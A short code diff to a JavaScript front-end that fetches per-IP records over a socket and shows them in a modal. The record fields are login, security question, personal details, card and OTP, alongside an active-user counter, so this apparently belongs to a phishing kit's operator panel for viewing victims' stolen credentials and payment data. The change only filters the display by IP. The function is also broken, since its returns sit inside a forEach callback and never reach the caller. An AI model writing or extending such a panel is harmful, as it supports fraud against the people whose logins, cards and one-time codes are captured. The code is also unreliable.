@@ -110,7 +110,7 @@ function showResultsModal(ipAddress) {
   socket.emit('getUserData', { ip: ipAddress });
   socket.on('setUserData', (userData) => {
     console.log(userData)
-    modalBody.innerHTML = formatUserDataForDisplay(userData);
+    modalBody.innerHTML = formatUserDataForDisplay(userData, ipAddress);
     const modal = new bootstrap.Modal(document.getElementById('resultsModal'));
     modal.show();
   })
@@ -150,10 +150,10 @@ function updateActiveUserCount(newCount) {
   document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
 }
 
-function formatUserDataForDisplay(userData) {
+function formatUserDataForDisplay(userData, ip) {
 
   userData.forEach(([ipAddress, details]) => {
-   
+    if (details.ip == ip) {
       if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
 
          return `   <div class="card">
@@ -196,7 +196,7 @@ function formatUserDataForDisplay(userData) {
       } else {
         return `No result for IP: ${ipAddress}`;
       }
-    
+    }
   })
 
 }
